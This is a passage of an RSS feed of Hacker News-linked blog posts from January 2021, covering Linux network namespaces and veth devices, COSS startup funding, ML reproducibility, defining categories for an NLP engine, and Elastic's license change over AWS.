<p>Well, you might have heard already, that one of the Linux namespaces used for containers isolation is called <em>network namespace</em>. From <a href="https://man7.org/linux/man-pages/man8/ip-netns.8.html"><code>man ip-netns</code></a>, <em>"network namespace is logically another copy of the network stack, with its own routes, firewall rules, and network devices."</em> For the sake of simplicity, this is the only namespace we're going to use in this article. Instead of creating fully-isolated containers, we'd rather restrict the scope to only the network stack.</p>
<p>One of the ways to create a network namespace is the <code>ip</code> tool - part of the de facto standard <a href="https://en.wikipedia.org/wiki/Iproute2">iproute2</a> collection:</p>
<pre><code>$ sudo ip netns add netns0
$ ip netns
netns0</code></pre>
<p>How to start using the just created namespace? There is a lovely Linux command called <code>nsenter</code>. It enters one or more of the specified namespaces and then executes the given program:</p>
<pre><code>$ sudo nsenter --net=/var/run/netns/netns0 bash
# The newly created bash process lives in netns0

$ sudo ./inspect-net-stack.sh
&gt; Network devices
1: lo: &lt;LOOPBACK&gt; mtu 65536 qdisc noop state DOWN mode DEFAULT group default qlen 1000
    link/loopback 00:00:00:00:00:00 brd 00:00:00:00:00:00

&gt; Route table

&gt; Iptables rules
-P INPUT ACCEPT
-P FORWARD ACCEPT
-P OUTPUT ACCEPT</code></pre>
<p>From the output above it's clear that the <em>bash</em> process running inside <code>netns0</code> namespace sees a totally different network stack. There is no routing rules at all, no custom iptables chain, and only one loopback network device. So far, so good...</p>
<div>
    <p><img src="https://iximiuz.com/container-networking-is-simple/network-namespace-4000-opt.png" width="80%"></p><p><i>Network namespace visualized.</i></p>
</div>


<h2 id="a-namevethaconnecting-containers-to-host-with-virtual-ethernet-devices-veth"><a name="veth"></a>Connecting containers to host with virtual Ethernet devices (veth)</h2>
<p>A dedicated network stack would be not so useful if we could not communicate with it. Luckily, Linux provides a suitable facility for that - a virtual Ethernet device! From <a href="https://man7.org/linux/man-pages/man4/veth.4.html"><code>man veth</code></a>, <em>"veth devices are virtual Ethernet devices. They can act as tunnels between network namespaces to create a bridge to a physical network device in another namespace, but can also be used as standalone network devices."</em></p>
<p>Virtual Ethernet devices always go in pairs. No worries, it'll be clear when we take a look at the creation command:</p>
<pre><code>$ sudo ip link add veth0 type veth peer name ceth0</code></pre>
<p>With this single command, we just created a pair of <em>interconnected</em> virtual Ethernet devices. The names <code>veth0</code> and <code>ceth0</code> have been chosen arbitrarily:</p>
<pre><code>$ ip link
1: lo: &lt;LOOPBACK,UP,LOWER_UP&gt; mtu 65536 qdisc noqueue state UNKNOWN mode DEFAULT group default qlen 1000
    link/loopback 00:00:00:00:00:00 brd 00:00:00:00:00:00
2: eth0: &lt;BROADCAST,MULTICAST,UP,LOWER_UP&gt; mtu 1500 qdisc fq_codel state UP mode DEFAULT group default qlen 1000
    link/ether 52:54:00:e3:27:77 brd ff:ff:ff:ff:ff:ff
5: ceth0@veth0: &lt;BROADCAST,MULTICAST,M-DOWN&gt; mtu 1500 qdisc noop state DOWN mode DEFAULT group default qlen 1000
    link/ether 66:2d:24:e3:49:3f brd ff:ff:ff:ff:ff:ff
6: veth0@ceth0: &lt;BROADCAST,MULTICAST,M-DOWN&gt; mtu 1500 qdisc noop state DOWN mode DEFAULT group default qlen 1000
    link/ether 96:e8:de:1d:22:e0 brd ff:ff:ff:ff:ff:ff</code></pre>
<p>Both <code>veth0</code> and <code>ceth0</code> after creation resides on the host's network stack (also called root network namespace). To connect the root namespace with the <code>netns0</code> namespace, we need to keep one of the devices in the root namespace and move another one into the <code>netns0</code>:</p>
<pre><code>$ sudo ip link set ceth0 netns netns0

# List all the devices to make sure one of them disappeared from the root stack
$ ip link
1: lo: &lt;LOOPBACK,UP,LOWER_UP&gt; mtu 65536 qdisc noqueue state UNKNOWN mode DEFAULT group default qlen 1000
    link/loopback 00:00:00:00:00:00 brd 00:00:00:00:00:00
2: eth0: &lt;BROADCAST,MULTICAST,UP,LOWER_UP&gt; mtu 1500 qdisc fq_codel state UP mode DEFAULT group default qlen 1000
    link/ether 52:54:00:e3:27:77 brd ff:ff:ff:ff:ff:ff
6: veth0@if5: &lt;BROADCAST,MULTICAST&gt; mtu 1500 qdisc noop state DOWN mode DEFAULT group default qlen 1000
    link/ether 96:e8:de:1d:22:e0 brd ff:ff:ff:ff:ff:ff link-netns netns0</code></pre>
<p>Once we turn the devices on and assign proper IP addresses, any packet occurring on one of the devices will immediately pop up on its peer device connecting two namespaces. Let's start from the root namespace:</p>
<pre><code>$ sudo ip link set veth0 up
$ sudo ip addr add 172.18.0.11/16 dev veth0</code></pre>
<p>And continue with the <code>netns0</code>:</p>
<pre><code>$ sudo nsenter --net=/var/run/netns/netns0
$ ip link set lo up  # whoops
$ ip link set ceth0 up
$ ip addr add 172.18.0.10/16 dev ceth0
$ ip link
1: lo: &lt;LOOPBACK,UP,LOWER_UP&gt; mtu 65536 qdisc noqueue state UNKNOWN mode DEFAULT group default qlen 1000
    link/loopback 00:00:00:00:00:00 brd 00:00:00:00:00:00
5: ceth0@if6: &lt;BROADCAST,MULTICAST,UP,LOWER_UP&gt; mtu 1500 qdisc noqueue state UP mode DEFAULT group default qlen 1000
    link/ether 66:2d:24:e3:49:3f brd ff:ff:ff:ff:ff:ff link-netnsid 0</code></pre>
<div>
    <p><img src="https://iximiuz.com/container-networking-is-simple/veth-4000-opt.png" width="100%"></p><p><i>Connecting network namespaces via veth device.</i></p>
</div>

<p>We are ready to check the connectivity:</p>
<pre><code># From `netns0`, ping root's veth0
$ ping -c 2 172.18.0.11
PING 172.18.0.11 (172.18.0.11) 56(84) bytes of data.
64 bytes from 172.18.0.11: icmp_seq=1 ttl=64 time=0.038 ms
64 bytes from 172.18.0.11: icmp_seq=2 ttl=64 time=0.040 ms

--- 172.18.0.11 ping statistics ---
2 packets transmitted, 2 received, 0% packet loss, time 58ms
rtt min/avg/max/mdev = 0.038/0.039/0.040/0.001 ms

# Leave `netns0`
$ exit

# From root namespace, ping ceth0
$ ping -c 2 172.18.0.10
PING 172.18.0.10 (172.18.0.10) 56(84) bytes of data.
64 bytes from 172.18.0.10: icmp_seq=1 ttl=64 time=0.073 ms
64 bytes from 172.18.0.10: icmp_seq=2 ttl=64 time=0.046 ms

--- 172.18.0.10 ping statistics ---
2 packets transmitted, 2 received, 0% packet loss, time 3ms
rtt min/avg/max/mdev = 0.046/0.059/0.073/0.015 ms</code></pre>
<p>At the same time, if we try to reach any other addresses from the <code>netns0</code> namespace, we are not going to succeed:</p>
<pre><code># Inside root namespace
$ ip addr show dev eth0
2: eth0: &lt;BROADCAST,MULTICAST,UP,LOWER_UP&gt; mtu 1500 qdisc fq_codel state UP group default qlen 1000
    link/ether 52:54:00:e3:27:77 brd ff:ff:ff:ff:ff:ff
    inet 10.0.2.15/24 brd 10.0.2.255 scope global dynamic noprefixroute eth0
       valid_lft 84057sec preferred_lft 84057sec
    inet6 fe80::5054:ff:fee3:2777/64 scope link
       valid_lft forever preferred_lft forever

# Remember this 10.0.2.15

$ sudo nsenter --net=/var/run/netns/netns0

# Try host's eth0
$ ping 10.0.2.15
connect: Network is unreachable

# Try something from the Internet
$ ping 8.8.8.8
connect: Network is unreachable</code></pre>
<p>That's easy to explain, though. There is simply no route in the <code>netns0</code> routing table for such packets. The only entry there shows how to reach <code>172.18.0.0/16</code> network:</p>
<pre><code># From `netns0` namespace:
$ ip route
172.18.0.0/16 dev ceth0 proto kernel scope link src 172.18.0.10</code></pre>
<p>Linux has a bunch of ways to populate the routing table. …</p></div></div>
<br/><p><em>Article truncated for RSS feed. Read the full article at <a href="https://iximiuz.com/en/posts/container-networking-is-simple/">https://iximiuz.com/en/posts/container-networking-is-simple/</a></em></p>]]>
            </description>
            <link>https://iximiuz.com/en/posts/container-networking-is-simple/</link>
            <guid isPermaLink="false">hacker-news-small-sites-25834444</guid>
            <pubDate>Tue, 19 Jan 2021 15:36:42 GMT</pubDate>
        </item>
        <item>
            <title>
<![CDATA[The COSS Monetization Reckoning Is Coming]]>
            </title>
            <description>
<![CDATA[
Score 7 | Comments 5 (<a href="https://news.ycombinator.com/item?id=25834170">thread link</a>) | @bhalp1
<br/>
January 19, 2021 | https://www.coss.community/jj/the-coss-monetization-reckoning-is-coming-2960 | <a href="https://web.archive.org/web/*/https://www.coss.community/jj/the-coss-monetization-reckoning-is-coming-2960">archive.org</a>
<br/><!-- hnss:readable-content --><hr/><div id="readability-page-1" class="page"><div>

          <div data-article-id="126" id="article-body">
            <p>Why am I writing this today, of all days? No real reason. It just struck me this morning to share the thought.</p>

<p>We now have an ALL TIME RECORD number (probably 100+) of COSS startups that have raised $5M+ (many have raised $10M+) in VC funding where the following two things are simultaneously True:</p>

<p>1) The COSS company has some early signs of open source momentum/traction as evidenced by GitHub Stars or project Downloads (by the way, both metrics are, on their own, deeply flawed as primary proxies for "company investable" heuristics).</p>

<p>2) The COSS company has no product IP nor clear product plans. Also, goes without saying, the company is "pre-revenue".</p>

<p>Most of these financings have NOT been publicly announced and no single firm has access to all the data (except maybe OSS Capital). In reality, my sense is that 2 out of 5 seed/pre-seed deals never get announced and perhaps the same is true for 1 out of 5 Series A deals. I'm being conservative.</p>

<p>This is a shocking new reality driven primarily by the meteoric rise of great COSS companies like HashiCorp, Elastic, MongoDB, GitHub, MuleSoft, Starburst, Confluent, GitLab and many others over the last 5 ~ years.</p>

<p>Everyone wants to find and seed invest in the next HashiCorp. If you miss that, funding the Series A is also a great idea, no?</p>

<p>Quite simply, over the last 2 ~ years, something on the order of 100+ pre-revenue and pre-product COSS companies have been seriously well funded with nothing more than a deck and a promising open source project. I cannot share this data publicly, but just know that it is accurate and that we have this data.</p>

<p>Basically every VC across all fund sizes under the sun who invests in "tech" (which is vastly digital, which is vastly software, which is vastly open source these days) is now a COSS startup investor.</p>

<p>Is this entirely bad? No. Is this entirely good? Also no. Let me explain...</p>

<p>Why is this "Bad":</p>

<p>-Founders who partner with VCs that do NOT understand the fundamentals of open source are going to be misled, distracted with having to educate their investors from scratch about very nuanced and complex things and their relationships will be extremely far from idealistic. Very few VCs (it is important to focus on the partner/individual at a given firm, not the firm itself.. given that literally only one firm on earth focuses on COSS exclusively) have a deep understanding of open source, let alone COSS, and many/most have zero-to-no track record of actually helping COSS companies successfully navigate their journeys from pre-revenue to PMF and beyond.</p>

<p>-Founders who raise meaningful capital from VC well before even possessing a basic understanding market dynamics will be forced to have full clarity on those issues in short order, and if they are not able to graduate and grow into investor expectations within 1-2 years at most, they will experience very painful misalignment conversations... which will cause them to betray social contracts and principles set in place with other key stakeholders in their open source ecosystems.</p>

<p>Why is this "Good":</p>

<p>-More COSS companies are getting funding than ever, enabling FOSS creators to transform into founders of well funded startups.</p>

<p>-Early-stage COSS companies can take this funding and invest it purely/largely in the growth of their FOSS communities, creating new abundance for the world in a positive-sum way.</p>

<p>-The VC world is learning faster than ever about the fundamental benefits of open source at the core of capitalism and business. This is a huge net positive.</p>

<p>Overall, I'm thrilled to see so much COSS funding and we inclusively cover all of it here on COSS Community via COSS Weekly and our data resources. </p>

<p>However, in these times of high capital abundance in the private startup/company equity investing markets, founders should be more careful than ever about deciding who they partner with... this is VASTLY more critical than naively optimizing for "max price for min dilution".</p>


          </div>

        </div></div>]]>
            </description>
            <link>https://www.coss.community/jj/the-coss-monetization-reckoning-is-coming-2960</link>
            <guid isPermaLink="false">hacker-news-small-sites-25834170</guid>
            <pubDate>Tue, 19 Jan 2021 15:16:19 GMT</pubDate>
        </item>
        <item>
            <title>
<![CDATA[Is your machine learning reproducible?]]>
            </title>
            <description>
<![CDATA[
Score 4 | Comments 0 (<a href="https://news.ycombinator.com/item?id=25834005">thread link</a>) | @htahir111
<br/>
January 19, 2021 | https://blog.maiot.io/is-your-ml-reproducible/ | <a href="https://web.archive.org/web/*/https://blog.maiot.io/is-your-ml-reproducible/">archive.org</a>
<br/><!-- hnss:readable-content --><hr/><div id="readability-page-1" class="page"><section id="post-content">
    <div id="blogpost">
        <p>It is now widely agreed that <a href="https://blog.ml.cmu.edu/2020/08/31/5-reproducibility/">reproducibility is an important aspect of any scientific endeavor</a>.  With Machine Learning being a scientific discipline, as well as an engineering one, reproducibility is equally important here.</p>

<p>There is widespread fear in the ML community that we are living through a <a href="https://www.wired.com/story/artificial-intelligence-confronts-reproducibility-crisis">reproducibility crisis</a>. Efforts like the <a href="https://paperswithcode.com/rc2020">Papers with Code Reproducibility Challenge</a>, signaled a clear call-to-action for practitioners, after a 2016 Nature survey revealed that <a href="https://www.nature.com/news/1-500-scientists-lift-the-lid-on-reproducibility-1.19970">70% of results are non-reproducible</a>.</p>

<p>While a lot of the talk amongst the community has centered on <a href="https://www.sciencedirect.com/science/article/pii/S2666389920300933">reproducing machine learning results in research</a>, there has been less focus on the production side of things. Therefore, today letâ€™s focus more on the topic of reproducible ML in production and create a larger conversation around it.</p>

<h2 id="why-is-reproducibility-important">Why is reproducibility important?</h2>

<p>
  â€œIf you canâ€™t repeat it, you canâ€™t trust itâ€� - All Ops Teams
</p>

<p>A good question to start with is why exactly reproducibility is important, for machine learning in particular. Here are list of benefits one gains by ensuring reproducibility:</p>

<ul>
  <li>Increases <strong>trust</strong></li>
  <li>Promotes <strong>explainability</strong> of ML results</li>
  <li>Increases <strong>reliability</strong></li>
  <li>Fulfills <strong>ethical</strong>, <strong>legal</strong>, and <strong>regulatory</strong> requirements</li>
</ul>

<p>Concretely, ML models tend to go through a lifecycle of being destroyed, forged anew and re-created as <a href="https://blog.maiot.io/technical_debt/">development evolves from rudimentary notebook snippets to a testable, productionized codebase</a>. Therefore, we better make sure that every time a model is (re-) trained, the results are what we expect them to be.</p>

<h2 id="whats-the-big-deal">Whatâ€™s the big deal?</h2>
<p>One would think that reproducibility in production ML should be easy. After all, most machine learning is scripting. How hard can it be to simply execute a bunch of scripts again at a later stage and come to the exact same result, right?</p>

<p><strong>wrong</strong></p>

<p>Reproducibility of machine learning is hard because it spans many different disciplines, from understanding non-deterministic algorithmic behaviors, to software engineering best practices. Leaving aside the fact that most machine learning code quality tends to err towards the low side (due to the experimental nature of the work), there is an inherent complexity to ML which makes things even harder.</p>

<p>E.g. Just training a model on the same data with the same configuration does not mean the same model is produced. Perhaps one could achieve a similar <em>overall</em> accuracy (or whatever other metric), but even a slight change in parameters might skew metrics for slices of your data - leading to <a href="https://www.theverge.com/2018/1/12/16882408/google-racist-gorillas-photo-recognition-algorithm-ai">sometimes very unpleasant results</a></p>

<p>So, how can we ensure that stuff like does not happen? In my opinion, one can break down reproducibility in the following aspects:</p>

<ul>
  <li>The code</li>
  <li>The configuration</li>
  <li>The environment</li>
  <li>The data</li>
</ul>

<p>Letâ€™s look at each of these in turn.</p>

<h3 id="code">Code</h3>
<p>Checking code into a version control system like Git ensures a clean trace of how code evolves, and the ability to rollback to any point in history. However, Git alone is not a fix for reproducibility, but only for one aspect of it.</p>

<p>In reality, reproducibility in production is solved by version control, testing of code as well as integrations, and idempotent deployment automation. This is hard to apply in practice. E.g. The main tool for ML is Jupyter notebooks, which are notoriously difficult to check into version control. Even worse, most notebook code is not sequential in its execution, and can have an arbitrary, impossible to reproduce, sequence of execution.</p>

<p>But even if ML practitioners follow a pattern of refactoring their code into separate modules, simply checking modules into source control is still not enough to ensure reproducibility. One needs to link the commit history to model training runs and models. This can be achieved e.g. by enforcing a standard in your team that pins a git sha to experiment runs. That way there is a global unique ID that ties the code and configuration (see below) to the results it produced.</p>

<h3 id="configuration">Configuration</h3>
<p>Software Engineering preaches separation of application code and application configuration to allow for predictable and deterministic software behavior across environments. This actually translates well in a machine learning code: E.g. one can separate the model definition and training loop code, from the associated hyper-parameters which define the configuration.</p>

<p>The first step to unlock reproducibility is to actually separate configuration from code in the first place. For me this means, the code itself should NOT define:</p>

<ul>
  <li>Features</li>
  <li>Labels</li>
  <li>Split parameters (e.g. 80-20 split)</li>
  <li>Preprocessing parameters (e.g. the fact that data was normalized)</li>
  <li>Training hyper-parameters (including pre-processing parameters)</li>
  <li>Evaluation criteria, .e.g, metrics</li>
</ul>

<p>Ideally all these are tracked separately in a <a href="https://blog.maiot.io/declarative_configs_for_mlops/">declarative config</a> that is human readable.</p>

<h3 id="environment">Environment</h3>
<p>If a ML result is produced on a dev local machine, there is a high chance it is not going to be reproducible. Why? Because developers, especially relatively inexperienced ones, are not super diligent in creating and maintaining proper virtual environments.</p>

<p>The obvious solution for this one is containerizing applications, with lets say, <a href="https://docker.com/">Docker</a>. However, here is another example of when skills of ML practitioners begin diverging from conventional software engineers. Most data scientists are not trained in these matters, and require proper organizational support to help and encourage them to produce containerized applications.</p>

<h3 id="data">Data</h3>
<p>And finally, we arrive at the data. Data versioning has become one of the most discussed topics in the production machine learning community. Unlike code, you canâ€™t simply check data into version control easily (although tools like <a href="https://dvc.org/">DVC</a> are attempting just that).</p>

<p>In the same way as code, achieving basic versioning of data does not necessarily ensure reproducibility. There is a whole bunch of metadata associated with how data is utilized in machine learning development, all of which is necessary to persist to ensure trainings are reproducible.</p>

<p>Here is a simple, but common, example that illustrates this point. If you have ever worked with machine learning, have you ever created a folder/storage bucket somewhere that has random files in varying preprocessing states? Something like, <code>normalized_1.json</code> or perhaps even timestamped <code>12_02_19.csv</code>? Technically, a timestamped file is versioned data, but that does not mean associated runs with it are reproducible: One would have to know how, when and where (i.e. the aforementioned metadata) these versioned files are used to ensure reproducibility.</p>

<h3 id="concrete-example">Concrete Example</h3>
<p>While it may fall outside the scope of this blog, the open-source MLOps framework ZenML showcases a clear example 
of putting these principles in action <a href="https://docs.zenml.io/benefits/ensuring-ml-reproducibility.html">here</a></p>

<h2 id="conclusion">Conclusion</h2>
<p>Reproducibility in machine learning is not trivial, and ensuring it in production is even harder. ML teams need to be fully aware of the precise aspects to track in their processes to unlock reproducibility.</p>

<p>If youâ€™re looking for a head start to enable reproducibility: check out <a href="https://github.com/maiot-io/zenml">ZenML</a>, an open-source MLOps framework for reproducible machine learning - and leave a star while youâ€™re there.</p>

<p>Also, hop on over to our <a href="https://zenml.io/slack-invite">Slack Channel</a> if you want to continue the discussion.</p>

<p>Iâ€™ll be back in a few days to talk about using Git in a machine learning setting - stay tuned!</p>

    </div>
</section></div>]]>
            </description>
            <link>https://blog.maiot.io/is-your-ml-reproducible/</link>
            <guid isPermaLink="false">hacker-news-small-sites-25834005</guid>
            <pubDate>Tue, 19 Jan 2021 15:00:56 GMT</pubDate>
        </item>
        <item>
            <title>
<![CDATA[Building an NLP Engine Is Hard, but Not as Hard as Defining Terms]]>
            </title>
            <description>
<![CDATA[
Score 6 | Comments 0 (<a href="https://news.ycombinator.com/item?id=25833835">thread link</a>) | @wagslane
<br/>
January 19, 2021 | https://qvault.io/2021/01/19/building-an-nlp-engine-is-hard-but-not-as-hard-as-defining-terms/ | <a href="https://web.archive.org/web/*/https://qvault.io/2021/01/19/building-an-nlp-engine-is-hard-but-not-as-hard-as-defining-terms/">archive.org</a>
<br/><!-- hnss:readable-content --><hr/><div id="readability-page-1" class="page"><div itemprop="text">
<p>In my full-time role at <a aria-label="Nuvi (opens in a new tab)" href="https://www.nuvi.com/blog/strategic-decision-making-nuvis-all-new-language-engine" target="_blank" rel="noreferrer noopener nofollow">Nuvi</a>, I’ve been lucky enough to work on a team where we’re able to push the boundaries in the natural language processing field. We built out several different “facets” that we score text on, including sentiment, emotion, vulgarity, tense, and currently, we’re working on promotion detection.</p>
<p>While the technical side of NLP is hard, one of the hardest things was unexpected – defining the boundaries between the categories in question. Which words count as vulgar? Does anticipation entail positive emotions? Can a single tweet exude anger and fear at the same time despite being opposites according to Plutchik? In this article, we’ll explore some of these questions and how we ended up answering them.</p>
<h2>Emotion Facets</h2>
<p>The eight emotions we set out to build a classification engine for are defined by <a aria-label="Plutchik's wheel (opens in a new tab)" href="https://www.6seconds.org/2020/08/11/plutchik-wheel-emotions/" target="_blank" rel="noreferrer noopener nofollow">Plutchik’s wheel</a>:</p>
<ul><li>Anger</li><li>Fear</li><li>Joy</li><li>Sadness</li><li>Trust</li><li>Disgust</li><li>Anticipation</li><li>Surprise</li></ul>
<p>Our emotion detection is based on a probabilistic algorithm that requires training and test data from human-annotations. In order to get a high-quality dataset, we found early on that simply telling our annotators to categorize sentences as to whether or not the author was expressing “anticipation” wasn’t <em>nearly</em> enough instruction. Once we got down to the brass tacks of some specific examples, we found that <em>we didn’t even agree internally</em> on classifications in many instances.</p>
<p>Let’s look at some of the examples we had trouble with as a team and go over the conclusions we came to. If you have thoughts be sure to <a href="https://twitter.com/wagslane" rel="noopener">tweet at me</a> and let me know what you think.</p>
<p>Keep in mind that the definition of anticipation according to <a aria-label="Oxford (opens in a new tab)" href="https://languages.oup.com/google-dictionary-en/" target="_blank" rel="noreferrer noopener nofollow">Oxford</a> is “The action of anticipating something; expectation or prediction.” In other words, we’re looking for when someone is showing forethought, making a prediction, etc. Here are some examples we agreed on quickly as expressing “anticipation”:</p>
<ul><li>“I can’t wait to go to the movie theater again!”</li><li>“I’m so excited for sports to come back, can’t happen soon enough!”</li><li>“Tesla stock is way too high, it’s going to tank soon.”</li></ul>
<p>The first one we had trouble with was:</p>
<blockquote><p>I’m so nervous to go back to the office. Working from home has been great.</p></blockquote>
<p>Some of us had the idea that “anticipation” carried a connotation of “being excited”. In other words, you can’t really anticipate something if you <em>don’t want</em> it to happen. We eventually decided that this isn’t a useful definition for several reasons. First, we already do sentiment classification separately, so baking positive sentiment into the anticipation facet isn’t super helpful. Second, the opposite of anticipation in our emotion wheel is “surprise”. We all agreed that surprises can be good or bad. It stands to reason the surpise’s opposite, anticipation, should behave the same way.</p>
<p>The next problematic example arose a few days later:</p>
<blockquote><p>I don’t know if I’m going to win</p></blockquote>
<p>One of my teammates made the point that this sentence expresses apprehension, which can be considered a form of anticipation. I played devil’s advocate saying that “I don’t know” is the polar opposite of a prediction, how can that be anticipation?</p>
<p>In the end, we found that we had to provide paragraph-long explanations of each category to our annotators, complete with examples of what is and isn’t counted as a part of the category in question.</p>
<h2>Vulgarity Detection</h2>
<p>NSFW Disclaimer: <em>I’m going to talk about our vulgarity detection, and will need to say some naughty words. If you find that offensive turn back now!</em></p>
<p>The way the current iteration of our vulgarity engine works is to take a piece of text as input, for example:</p>
<blockquote><p>“Well hot damn those potatos hit the spot!”</p></blockquote>
<p>And output a fractional score from 0-1 representing how likely the text is to contain vulgar text. For the above sample, it might be something like <code>.75</code> Which brings us to our first problem, <strong>what do <em>we</em> consider to be vulgar?</strong></p>
<p>According to one of my teammates “damn”, “shit” and “hell” aren’t bad words. However, while <em>he may not</em> consider them to be, <em><a href="https://www.cs.cmu.edu/~biglou/resources/bad-words.txt" target="_blank" aria-label=" (opens in a new tab)" rel="noreferrer noopener nofollow">many people do</a></em>. We’re left in the interesting position of trying to rank all the vulgar words. Here are some of the biggest issues we ran into with vulgarity:</p>
<h3>Not all bad words are created equally</h3>
<p>Most people would loosely agree with the following ranking from most vulgar -&gt; to least vulgar :</p>
<ul><li>Fuck</li><li>Bitch</li><li>Shit</li><li>Damn</li><li>Hell</li></ul>
<h3>Religious / Culture Specific</h3>
<p>However, problems arise when people of different religious beliefs examine the list. A Christian person may consider the following list accurate:</p>
<ul id="block-e0d6e2ae-fb75-4375-89e4-0ce5d61c4e1f"><li>Fuck</li><li>Bitch</li><li>Jesus Christ!</li><li>Oh my God!</li><li>Shit</li><li>Damn</li><li>Hell</li></ul>
<p>Whereas the atheist/agnostic/pagan may not consider “Jesus Christ!” or “Oh my God!” to deserve to be on the list at all.</p>
<h3>Geographically Specific</h3>
<p>If you’re from England proper, you may also expect a few additional words:</p>
<ul id="block-e0d6e2ae-fb75-4375-89e4-0ce5d61c4e1f"><li>Fuck</li><li>Wanker</li><li>Bitch</li><li>Shit</li><li>Bloody</li><li>Damn</li><li>Hell</li></ul>
<p>In the end, we ended up mixing the concept of probability and intensity for the sake of simplicity and we’ve found that our clients are happy with the result. For example, the presence of an intensely “bad” word that’s recognized by basically everyone as vulgar will have a higher weight in the probability calculation than one which is weaker or not accepted by everyone as “bad”.</p>
<p><code>vulgarity_weight = intensity * acceptance</code></p>
<p>Once we started looking at everything as a fluid spectrum it became much easier to agree amongst ourselves what constitutes “vulgarity”. My coworker who claimed “shit”, “damn”, and “hell” aren’t vulgar easily admitted that they’re <em>more vulgar</em> than trivial interjections like “crap”, “dang”, or “heck”.</p>
<h2>Promotion and Solicitation Detection</h2>
<p>The project we’re working on currently has also turned out to be a vague and difficult one to pin down. The goal is to classify text as to whether it’s promotional or not, but we’ve had a hard time defining what we want. For example, we all agreed quickly that the following we classify as :promotional”:</p>
<ul><li>“We are doing a sweet promo this week! Sign up for 20% off”</li><li>“Our new product just launched, be sure to check it out”</li><li>“GORGEOUS 😍 previously owned Gucci backpack for $1700😍😍 ⭐️WE SHIP ⭐️ Call the store to purchase 555-555-5555 📲”</li></ul>
<p>The following however posed an interesting problem:</p>
<blockquote><p>Do I want a $42&nbsp;@gucci lipstick yes I do…. can I afford it right now No I cant&nbsp; but it’s soooo good!!!!!!!</p></blockquote>
<p>While it’s obviously promoting Gucci, it isn’t actually soliciting direct action from the reader. There’s no call to action. Is this a requirement of a solicitation as scored by Nuvi? We’re not sure yet – but we’re figuring that out.</p>

 </div></div>]]>
            </description>
            <link>https://qvault.io/2021/01/19/building-an-nlp-engine-is-hard-but-not-as-hard-as-defining-terms/</link>
            <guid isPermaLink="false">hacker-news-small-sites-25833835</guid>
            <pubDate>Tue, 19 Jan 2021 14:45:44 GMT</pubDate>
        </item>
        <item>
            <title>
<![CDATA[Amazon: Not OK – Why we had to change Elastic licensing]]>
            </title>
            <description>
<![CDATA[
Score 1385 | Comments 645 (<a href="https://news.ycombinator.com/item?id=25833781">thread link</a>) | @buro9
<br/>
January 19, 2021 | https://www.elastic.co/blog/why-license-change-AWS | <a href="https://web.archive.org/web/*/https://www.elastic.co/blog/why-license-change-AWS">archive.org</a>
<br/><!-- hnss:readable-content --><hr/><div id="readability-page-1" class="page"><div><div><div><div><p>We recently announced a license change: <a href="https://www.elastic.co/blog/licensing-change">Blog</a>, <a href="https://www.elastic.co/pricing/faq/licensing">FAQ</a>. We posted some <a href="https://www.elastic.co/blog/license-change-clarification">additional guidance</a> on the license change this morning. I wanted to share why we had to make this change.
</p><p>This was an incredibly hard decision, especially with my background and history around Open Source. I take our responsibility very seriously. And to be clear, this change most likely has zero effect on you, our users. It has no effect on our customers that engage with us either in cloud or on premises. Its goal, hopefully, is pretty clear.
</p><p>So why the change? AWS and Amazon Elasticsearch Service. They have been doing things that we think are just NOT OK since 2015 and it has only gotten worse. If we don’t stand up to them now, as a successful company and leader in the market, who will?
</p><p>Our license change is aimed at preventing companies from taking our Elasticsearch and Kibana products and providing them directly as a service without collaborating with us.
</p><p>Our license change comes after years of what we believe to be Amazon/AWS misleading and confusing the community - enough is enough.
</p><p>We’ve tried every avenue available including going through the courts, but with AWS’s  ongoing behavior, we have decided to change our license so that we can focus on building products and innovating rather than litigating.
</p><p>AWS’s behavior has forced us to take this step and we do not do so lightly. If they had not acted as they have, we would not be having this discussion today.
</p><p>We think that Amazon’s behavior is inconsistent with the norms and values that are especially important in the open source ecosystem. Our hope is to take our presence in the market and use it to stand up to this now so others don’t face these same issues in the future.
</p><p>In the open source world, trademarks are considered a great and positive way to protect product reputation. Trademarks have been used and enforced broadly. They are considered sacred by the open source community, from small projects to foundations like Apache to companies like RedHat. So imagine our surprise when Amazon launched their service in 2015 based on Elasticsearch and called it Amazon Elasticsearch Service. We consider this to be a pretty obvious trademark violation. NOT OK.
</p><p>I took a personal loan to register the Elasticsearch trademark in 2011 believing in this norm in the open source ecosystem. Seeing the trademark so blatantly misused was especially painful to me. Our efforts to resolve the problem with Amazon failed, forcing us to file a lawsuit. NOT OK.
</p><p>We have seen that this trademark issue drives confusion with users thinking Amazon Elasticsearch Service is actually a service provided jointly with Elastic, with our blessing and collaboration. This is just not true. NOT OK.
</p><p>When the service launched, imagine our surprise when the Amazon CTO tweeted that the service was released in collaboration with us. It was not. And over the years, we have heard repeatedly that this confusion persists. NOT OK.
</p><p><img src="https://images.contentstack.io/v3/assets/bltefdd0b53724fa2ce/bltc3e3a971d3b695d3/6006e46a0069f70f7771dab5/amazon-cto-tweet-license-change.jpg" data-sys-asset-uid="bltc3e3a971d3b695d3" alt="amazon-cto-tweet-license-change.jpg"></p><p>When Amazon announced their Open Distro for Elasticsearch fork, they used code that we believe was copied by a third party from our commercial code and provided it as part of the Open Distro project. We believe this further divided our community and drove additional confusion.
</p><p>More on this <a href="https://www.elastic.co/blog/dear-search-guard-users-including-amazon-elasticsearch-service-open-distro-and-others">here</a>. NOT OK.
</p><p>Recently, we found more examples of what we consider to be ethically challenged behavior. We have differentiated with proprietary features, and now we see these feature designs serving as "inspiration" for Amazon, telling us their behavior continues and is more brazen. NOT OK.
</p><p>We collaborate with cloud service providers, including Microsoft, Google, Alibaba, Tencent, Clever Cloud, and others. We have shown we can find a way to do it. We even work with other parts of Amazon. We are always open to doing that; it just needs to be OK.
</p><p>I believe in the core values of the Open Source Community: transparency, collaboration, openness. Building great products to the benefit of users across the world. Amazing things have been built and will continue to be built using Elasticsearch and Kibana.
</p><p>And to be clear, this change most likely has zero effect on you, our users. And no effect on our customers that engage with us either in cloud or on premises.
</p><p>We created Elasticsearch; we care about it more than anyone else. It is our life’s work. We will wake up every day and do more to move the technology forward and innovate on your behalf.
</p><p>Thanks for listening. If you have more questions or you want more clarification please read <a href="https://www.elastic.co/pricing/faq/licensing">here</a> or contact us at <a href="mailto:elastic_license@elastic.co">elastic_license@elastic.co</a>.
</p><p>Thank you. It is a privilege to be on this journey with you.
</p></div></div></div></div></div>]]>
            </description>
            <link>https://www.elastic.co/blog/why-license-change-AWS</link>
            <guid isPermaLink="false">hacker-news-small-sites-25833781</guid>
            <pubDate>Tue, 19 Jan 2021 14:40:16 GMT</pubDate>
